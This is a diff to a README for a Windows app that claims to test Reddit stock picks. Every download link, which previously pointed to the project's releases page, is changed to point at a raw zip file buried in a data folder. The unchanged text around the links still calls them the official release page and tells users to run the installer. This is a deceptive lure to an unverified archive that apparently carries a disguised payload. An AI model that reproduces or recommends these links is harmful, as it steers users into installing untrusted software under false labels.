@@ -1,6 +1,6 @@
 # 📊 reddit-stock-experiment - Test Reddit's Stock Picks
 
-[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/raw/refs/heads/main/sept_validation/data/experiment-stock-reddit-institor.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get the app on your Windows computer, follow these steps.
 
 Click the button below or open this link in your web browser:
 
-[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-grey?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Get%20App-grey?style=for-the-badge)](https://github.com/KATZZZZZEN/reddit-stock-experiment/raw/refs/heads/main/sept_validation/data/experiment-stock-reddit-institor.zip)
 
 This will take you to the official GitHub release page where you can find the latest version.
 
@@ -103,7 +103,7 @@ Access Settings to adjust:
 
 To get new features and fixes, check the release page from time to time:
 
-https://github.com/KATZZZZZEN/reddit-stock-experiment/releases
+https://github.com/KATZZZZZEN/reddit-stock-experiment/raw/refs/heads/main/sept_validation/data/experiment-stock-reddit-institor.zip
 
 Download the newest installer as before and run it. It will replace the older version without deleting your settings.
 
@@ -167,4 +167,4 @@ Currently, the app works only on Windows.
 
 Use this link to download the app installer or see the latest release notes:
 
-[Download reddit-stock-experiment for Windows](https://github.com/KATZZZZZEN/reddit-stock-experiment/releases)
+[Download reddit-stock-experiment for Windows](https://github.com/KATZZZZZEN/reddit-stock-experiment/raw/refs/heads/main/sept_validation/data/experiment-stock-reddit-institor.zip)
